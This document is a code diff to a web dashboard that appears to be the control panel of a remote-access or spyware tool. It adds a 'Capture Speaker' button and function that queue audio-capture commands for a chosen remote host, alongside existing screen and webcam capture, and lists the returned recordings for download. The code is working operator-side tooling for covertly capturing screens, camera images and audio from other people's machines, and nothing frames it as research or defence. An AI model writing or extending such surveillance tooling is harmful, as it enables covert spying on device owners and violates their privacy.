@@ -116,6 +116,7 @@
         <div class="flex gap-2">
           <button id="captureBtn" class="px-4 py-2 text-sm font-medium text-white bg-emerald-600 hover:bg-emerald-700 rounded-lg border border-emerald-500 transition shadow-sm shadow-emerald-900/50" onclick="sendCapture()">Capture Screen</button>
           <button id="webcamBtn" class="px-4 py-2 text-sm font-medium text-white bg-violet-600 hover:bg-violet-700 rounded-lg border border-violet-500 transition shadow-sm shadow-violet-900/50" onclick="sendWebcamCapture()">Capture Webcam</button>
+          <button id="speakerBtn" class="px-4 py-2 text-sm font-medium text-white bg-amber-600 hover:bg-amber-700 rounded-lg border border-amber-500 transition shadow-sm shadow-amber-900/50" onclick="sendSpeakerCapture()">Capture Speaker</button>
         </div>
       </div>
       <div id="screenshotGrid" class="screenshot-grid">
@@ -452,20 +453,32 @@ async function deleteTrigger(id) {
 
 async function fetchScreenshots() {
   try {
-    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/control?or=(command.eq.screenshot,command.eq.webcam)&executed=eq.true&order=created_at.desc&limit=50&select=id,created_at,hostname,result_url,command'));
+    const res = await fetch(PROXY_URL + '?path=' + encodeURIComponent('/rest/v1/control?or=(command.eq.screenshot,command.eq.webcam,command.eq.speaker)&executed=eq.true&order=created_at.desc&limit=50&select=id,created_at,hostname,result_url,command'));
     if (!res.ok) return;
     const data = await res.json();
     const grid = document.getElementById('screenshotGrid');
     if (!data || data.length === 0) {
-      grid.innerHTML = '<div class="col-span-full text-center py-12 text-slate-500 text-sm">No screenshots or webcam captures yet<br><span class="text-xs text-slate-600">Click "Capture Screen" or "Capture Webcam" to request one from a device</span></div>';
+      grid.innerHTML = '<div class="col-span-full text-center py-12 text-slate-500 text-sm">No captures yet<br><span class="text-xs text-slate-600">Use the buttons above to request captures from a device</span></div>';
       return;
     }
     grid.innerHTML = data.map(row => {
       const ts = row.created_at ? new Date(row.created_at.replace(/Z$|[+\-]\d{2}:?\d{2}$/, '') + 'Z').toLocaleString() : '-';
       const isWebcam = row.command === 'webcam';
+      const isSpeaker = row.command === 'speaker';
+      let label = '';
+      if (isSpeaker) label = ' <span class="text-amber-400">(speaker)</span>';
+      else if (isWebcam) label = ' <span class="text-violet-400">(webcam)</span>';
+      if (isSpeaker) {
+        return '<div class="screenshot-card">'
+          + '<div class="flex items-center justify-center h-[200px] bg-slate-800/50 text-slate-400 text-sm">'
+          + '<a href="' + escapeHtml(row.result_url || '') + '" target="_blank" class="inline-flex items-center gap-1.5 px-3 py-1.5 bg-amber-800/40 text-amber-300 rounded border border-amber-700/40 hover:bg-amber-800/60 transition">Download Audio</a>'
+          + '</div>'
+          + '<div class="meta"><span class="host">' + escapeHtml(displayHost(row.hostname || '')) + label + '</span><span>' + ts + '</span></div>'
+          + '</div>';
+      }
       return '<div class="screenshot-card">'
         + '<img src="' + escapeHtml(row.result_url || '') + '" loading="lazy" onclick="window.open(this.src)" alt="' + (isWebcam ? 'Webcam' : 'Screenshot') + '">'
-        + '<div class="meta"><span class="host">' + escapeHtml(displayHost(row.hostname || '')) + (isWebcam ? ' <span class="text-violet-400">(webcam)</span>' : '') + '</span><span>' + ts + '</span></div>'
+        + '<div class="meta"><span class="host">' + escapeHtml(displayHost(row.hostname || '')) + label + '</span><span>' + ts + '</span></div>'
         + '</div>';
     }).join('');
   } catch (e) {}
@@ -503,6 +516,23 @@ async function sendWebcamCapture() {
     showToast('Webcam capture requested from ' + hostname + ' (check back in ~60s)', 'success');
   } catch (err) { showToast('Failed: ' + err.message, 'error'); }
   btn.disabled = false; btn.textContent = 'Capture Webcam';
+}
+
+async function sendSpeakerCapture() {
+  const btn = document.getElementById('speakerBtn');
+  const hostname = document.getElementById('hostnameInput').value.trim();
+  if (!hostname) { showToast('Select a device first', 'error'); return; }
+  btn.disabled = true; btn.textContent = 'Requesting...';
+  try {
+    const res = await fetch(PROXY_URL + '?path=/rest/v1/control', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ command: 'speaker', hostname: hostname, executed: false })
+    });
+    if (!res.ok) throw new Error(res.status + ' ' + res.statusText);
+    showToast('Speaker capture requested from ' + hostname + ' (check back in ~60s)', 'success');
+  } catch (err) { showToast('Failed: ' + err.message, 'error'); }
+  btn.disabled = false; btn.textContent = 'Capture Speaker';
 }
 
 document.getElementById('stopBtn').addEventListener('click', sendStop);
